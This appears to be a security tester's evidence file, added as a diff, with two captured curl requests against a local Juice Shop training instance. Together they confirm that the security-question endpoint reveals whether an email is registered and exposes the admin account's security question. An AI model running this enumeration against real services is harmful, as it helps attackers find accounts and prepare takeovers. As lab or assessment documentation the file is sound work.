@@ -1,0 +1,28 @@
+================================================================
+================================================================
+
+----------------------------------------------------------------
+CAPTURE: 2026-10-27 22:30:48 UTC · HTTP 200 · 134 bytes
+COMMAND:
+curl -s http://127.0.0.1:3000/rest/user/security-question?email=admin@juice-sh.op
+----------------------------------------------------------------
+RAW RESPONSE (134 bytes) — unedited, full capture:
+{"question":{"id":2,"question":"Mother's maiden name?","createdAt":"2026-10-27T20:13:33.805Z","updatedAt":"2026-10-27T20:13:33.805Z"}}
+VERIFICATION NOTE:
+Expected per hypothesis: response differentiates known vs unknown emails (enumeration oracle).
+Observed: known email returns {"question":{...}}; unknown email returns {}. Differentiated — CONFIRMED. (Two captures in this file, in order.)
+Captured by: Forefront Security
+----------------------------------------------------------------
+
+----------------------------------------------------------------
+CAPTURE: 2026-10-27 22:30:48 UTC · HTTP 200 · 2 bytes
+COMMAND:
+curl -s http://127.0.0.1:3000/rest/user/security-question?email=nobody@nowhere.tld
+----------------------------------------------------------------
+RAW RESPONSE (2 bytes) — unedited, full capture:
+{}
+VERIFICATION NOTE:
+Expected per hypothesis: response differentiates known vs unknown emails (enumeration oracle).
+Observed: known email returns {"question":{...}}; unknown email returns {}. Differentiated — CONFIRMED. (Two captures in this file, in order.)
+Captured by: Forefront Security
+----------------------------------------------------------------
